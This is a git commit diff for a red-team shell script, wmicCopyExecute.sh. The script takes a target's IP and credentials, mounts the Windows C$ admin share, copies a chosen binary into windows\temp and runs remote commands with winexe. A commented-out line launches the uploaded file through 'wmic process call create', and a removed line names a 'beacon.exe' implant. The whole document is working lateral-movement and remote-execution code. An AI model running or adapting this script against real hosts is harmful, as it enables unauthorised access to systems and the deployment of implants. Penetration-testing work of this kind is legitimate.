98964a9539c70c189aaf2e3755ec1225c119f6c3
root <root@localhost.localdomain>
2016-06-18 17:26:31 -0400

    more updates

--- red-team/wmicCopyExecute.sh
+++ red-team/wmicCopyExecute.sh
@@ -7,9 +7,13 @@
 read -p "What is the target host's IP?: " ipaddy
 read -p "What is the targets username?: " username
 read -p "What is the targets password?: " password
+read -p "What is the local path of the binary?: " lpath
+read -p "What is the remote path?: " rpath
 
+mkdir /mnt/targetdrive
+mount.cifs //$ipaddy/C$ /mnt/targetdrive -o user=$username,password=$password
+cp $lpath /mnt/targetdrive/windows/temp 
+winexe -U "$username%$password" //$ipaddy ipconfig
+winexe -U "$username%$password" //$ipaddy "wmic os list brief"
+#winexe -U "$username%$password" //$ipaddy "wmic process call create $rpath"
 
-
-winexe -U "$username%$password" //172.16.1.103 ipconfig
-winexe -U "$username%$password" //172.16.1.103 "wmic os list brief"
-#winexe -U "$username%$password" //172.16.1.103 "wmic process call create c:\windows\temp\beacon.exe"
